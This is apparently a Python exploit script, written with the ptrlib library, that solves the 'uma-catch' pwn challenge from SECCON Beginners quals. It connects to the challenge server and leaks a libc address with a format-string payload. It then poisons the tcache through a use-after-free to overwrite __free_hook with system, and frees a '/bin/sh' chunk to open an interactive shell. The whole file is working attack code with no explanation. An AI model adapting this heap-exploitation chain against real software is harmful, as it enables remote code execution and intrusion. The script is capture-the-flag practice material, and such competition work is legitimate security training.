from ptrlib import *


libc = ELF("./libc-2.27.so")
# sock = Socket("localhost", 9999)
sock = Socket("nc uma-catch.quals.beginners.seccon.jp 4101")

def catch(index):
    sock.sendlineafter("command?\n> ", "1")
    sock.sendlineafter("index?\n> ", str(index))
    sock.sendlineafter("\n> ", "bay")

def name(index, name):
    sock.sendlineafter("command?\n> ", "2")
    sock.sendlineafter("index?\n> ", str(index))
    sock.sendlineafter("name?\n> ", name)

def show(index):
    sock.sendlineafter("command?\n> ", "3")
    sock.sendlineafter("index?\n> ", str(index))
    return sock.recvline()

def release(index):
    sock.sendlineafter("command?\n> ", "5")
    sock.sendlineafter("index?\n> ", str(index))

input("wating...")

catch(1)
name(1, "%11$p")
libc_start_main_231 = int(show(1), 16)

libc_base = libc_start_main_231 - 231 - libc.symbol("__libc_start_main")

print("[+] libc_base: {:x}".format(libc_base))


catch(2)

release(1)
release(2)

name(2, p64(libc_base + libc.symbol("__free_hook")))

catch(3)
catch(4) # allocate __free_hook

name(4, p64(libc_base + libc.symbol("system")))
name(3, "/bin/sh")

release(3)
sock.interactive()
